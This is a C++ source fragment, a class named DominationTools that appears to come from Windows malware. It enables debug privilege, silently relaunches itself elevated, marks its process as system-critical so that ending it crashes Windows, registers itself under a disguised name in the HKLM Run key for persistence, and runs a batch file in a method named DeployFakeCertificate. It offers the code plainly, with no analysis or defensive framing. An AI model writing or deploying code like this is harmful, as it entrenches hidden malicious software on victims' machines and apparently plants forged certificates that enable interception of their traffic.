class DominationTools{
	private:
		HKEY hKey;
		LONG lnRes;
		const char* czStartName = Current.fakename;
		const char* czExePath	= Current.name;

                HANDLE ntdll;
                RtlSetProcessIsCritical SetCriticalProcess;
                PROCESS_INFORMATION pi = { 0x00 };
                STARTUPINFOW si        = { 0x00 };


                BOOL SetPrivilege(BOOL bEnablePrivilege) {
                                HANDLE Proc, hTocken;
                                Proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
                                if (!OpenProcessToken(Proc, TOKEN_ALL_ACCESS, &hTocken)) return false;

                                TOKEN_PRIVILEGES tp;
                                LUID luid;
                                if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))  return  FALSE;
                                tp.PrivilegeCount = 1;
                                tp.Privileges[0].Luid = luid;
                                if (bEnablePrivilege)
                                        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                                else
                                        tp.Privileges[0].Attributes = 0;

                                if (!AdjustTokenPrivileges(hTocken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
                                        return FALSE;


                                return TRUE;

                }

	public:
		int EscalatePrivileges(){
			SHELLEXECUTEINFO ShExecInfo;
			ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
			ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
			ShExecInfo.hwnd = NULL;
			ShExecInfo.lpVerb = "runas";
			ShExecInfo.lpFile = Current.name;
			ShExecInfo.lpParameters = NULL;
			ShExecInfo.lpDirectory = NULL;
			ShExecInfo.nShow = SW_HIDE;
			ShExecInfo.hInstApp = NULL;
			ShExecInfo.hProcess = NULL;

			ShellExecuteEx(&ShExecInfo);

			return 0;
		}


                void EnableCriticalProcess(){
                        ntdll=LoadLibrary("ntdll.dll");
                        SetPrivilege(TRUE);

                        SetCriticalProcess=(RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)ntdll, "RtlSetProcessIsCritical");
                        SetCriticalProcess(TRUE, NULL, FALSE);
                }

		int EnableAutoStart(){
		        lnRes = RegOpenKeyEx(  HKEY_LOCAL_MACHINE,
		                                    "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		                                    0 , KEY_WRITE,
		                                    &hKey);
		        if( 0x00 == lnRes )
		        {
		            lnRes = RegSetValueEx(  hKey,
		                                    czStartName,
		                                    0,
		                                    REG_SZ,
		                                    (unsigned char*)czExePath,
		                                    strlen(czExePath) );
		        }

		        RegCloseKey(hKey);
			return 0;
		}
		int DisableAutoStart(){
			return 1;
		}
		void DeployFakeCertificate(){
			SetCurrentDirectory("AppData");
			system("settings.bat");
			SetCurrentDirectory("..");

		}
};

